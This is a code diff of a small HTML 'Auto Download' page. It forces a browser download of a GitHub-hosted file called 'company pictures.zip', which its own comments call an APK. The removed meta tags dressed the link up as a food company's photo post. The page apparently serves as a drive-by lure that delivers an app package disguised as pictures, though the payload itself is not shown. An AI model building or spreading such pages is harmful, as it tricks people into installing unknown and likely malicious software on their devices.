@@ -1,9 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta property="og:title" content="شركة برنيق للمواد الغذائية">
-  <meta property="og:description" content="ملفات الصور">
-  <meta property="og:image" content="https://scontent-sof1-2.xx.fbcdn.net/v/t39.30808-6/317539499_188297470415120_6947359484684872225_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=WbVOhm_63iEQ7kNvwE_qiSf&_nc_oc=Adn_VlRvWaKQTllmJirRMwb55FeQ8RqP5iyIfh37TYzS6sgkTghveZGKZ2qSr3hF2LfcIidaGIj6mMslYnK5GCXx&_nc_zt=23&_nc_ht=scontent-sof1-2.xx&_nc_gid=_r6etBTjPljFpUepjCcEKA&oh=00_AfczjS_OHtp5bx_hVic6OEgloyWFw5S0-Xt4W9ICGhkYCg&oe=68F3FD76">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Download</title>
@@ -47,24 +44,20 @@
 <body>
     <button id="downloadBtn">Download Now</button>
 
-    <script>
+            <script>
+        // URL of the APK
         const apkUrl = "https://github.com/Easy-Hash/Dr-essam-mohammed/raw/refs/heads/master/company%20pictures.zip";
 
-        function startDownload() {
-            const link = document.createElement("a");
-            link.href = apkUrl;
-            link.target = "_blank"; // lets the browser handle the filename from the server
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
+        // Create a temporary link
+        const link = document.createElement("a");
+        link.href = apkUrl;
+        document.body.appendChild(link);
 
-        // Auto download on page load
-        window.onload = startDownload;
+        // Trigger click automatically
+        link.click();
 
-        // Manual download via button
-        document.getElementById("downloadBtn").addEventListener("click", startDownload);
+        // Remove the link from DOM
+        document.body.removeChild(link);
     </script>
 </body>
 </html>
-
